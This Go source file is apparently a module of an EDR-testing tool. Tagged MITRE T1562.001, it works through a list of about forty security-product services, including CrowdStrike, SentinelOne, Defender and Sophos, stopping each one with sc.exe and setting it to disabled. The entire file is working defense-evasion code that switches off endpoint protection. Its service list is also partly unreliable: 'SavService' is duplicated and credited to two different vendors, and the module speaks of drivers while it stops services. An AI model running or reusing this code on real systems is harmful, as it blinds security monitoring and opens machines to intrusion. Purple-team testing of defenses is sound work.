package modules

import (
	"agentide/core"
	"os/exec"
	"time"
)

// unloadDriverModule attempts to unload EDR kernel drivers
// This tests if the EDR monitors and prevents driver unloading
type unloadDriverModule struct {
	logger *core.Logger
	cfg    *core.Config
}

func (m *unloadDriverModule) Name() string { return "unload_driver" }

func (m *unloadDriverModule) Run() RawResult {
	start := time.Now()
	result := RawResult{
		ModuleName: m.Name(),
		MitreID:    "T1562.001", // Disable Security Tools - Driver unload
		Action:     "Attempt to unload EDR kernel drivers",
	}

	disabledCount := 0
	var details []string

	// Known EDR driver names to attempt unloading
	edrDrivers := []string{
		"CylanceSvc",           // Cylance
		"CylanceSvcV2",         // Cylance v2
		"CSAgent",              // CrowdStrike Falcon
		"CSAgentV2",            // CrowdStrike v2
		"SavService",           // SentinelOne
		"SentinelAgent",        // SentinelOne
		"SentinelAgentV2",      // SentinelOne v2
		"PANDA",                // Panda Security
		"MBAMService",          // Malwarebytes
		"MBAMService64",        // Malwarebytes 64-bit
		"SophosEndPointService", // Sophos
		"SavService",           // Sophos
		"SymantecEndpointProtection", // Symantec
		"SepMasterService",     // Symantec
		"McAfeeFramework",      // McAfee
		"McAfeeAgent",          // McAfee
		"MFEFramework",         // McAfee
		"TrendMicroSolutionPlatform", // Trend Micro
		"TrendMicroCommon",     // Trend Micro
		"TrendMicroSecurityAgent", // Trend Micro
		"Kaspersky",            // Kaspersky
		"AVP",                  // Kaspersky
		"Bitdefender",          // Bitdefender
		"BDSvc",                // Bitdefender
		"EsetService",          // ESET
		"EsetNod32",            // ESET
		"FireEyeAgent",         // FireEye
		"XAGService",           // FireEye
		"CarbonBlack",          // Carbon Black
		"CbEnterprise",         // Carbon Black
		"CbEndpoint",           // Carbon Black
		"CybereasonSensor",     // Cybereason
		"CybereasonService",    // Cybereason
		"ElasticEndpoint",      // Elastic Endpoint
		"ElasticAgent",         // Elastic
		"MicrosoftDefenderATP", // Microsoft Defender ATP
		"Sense",                // Microsoft Defender
		"MsMpEng",              // Microsoft Defender
		"WdNisSvc",             // Windows Defender Network Inspection
		"WinDefend",            // Windows Defender
	}

	for _, driver := range edrDrivers {
		if m.stopAndDisableService(driver) {
			disabledCount++
			details = append(details, driver+" stopped and disabled")
		}
	}

	result.ElapsedMs = time.Since(start).Milliseconds()

	if disabledCount > 0 {
		result.Notes = "EDR drivers stopped: " + joinStrings(details, "; ")
		result.OSFeedback.ProcessKilled = false
		result.OSFeedback.AccessDenied = false
	} else {
		result.Notes = "No EDR drivers could be stopped; all resisted"
		result.OSFeedback.AccessDenied = true
	}

	return result
}

// stopAndDisableService attempts to stop and disable a Windows service
func (m *unloadDriverModule) stopAndDisableService(serviceName string) bool {
	// Try to stop the service
	cmd := exec.Command("sc.exe", "stop", serviceName)
	err := cmd.Run()
	if err != nil {
		return false
	}

	// Wait a bit for the service to stop
	time.Sleep(1 * time.Second)

	// Disable the service
	cmd = exec.Command("sc.exe", "config", serviceName, "start=", "disabled")
	err = cmd.Run()
	if err != nil {
		return false
	}

	// Verify the service is disabled
	cmd = exec.Command("sc.exe", "qc", serviceName)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return false
	}

	// Check if the output contains "DISABLED"
	return contains(string(output), "DISABLED")
}

func contains(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr || len(s) > len(substr) && (s[:len(substr)] == substr || s[len(s)-len(substr):] == substr || containsSubstring(s, substr)))
}

func containsSubstring(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}

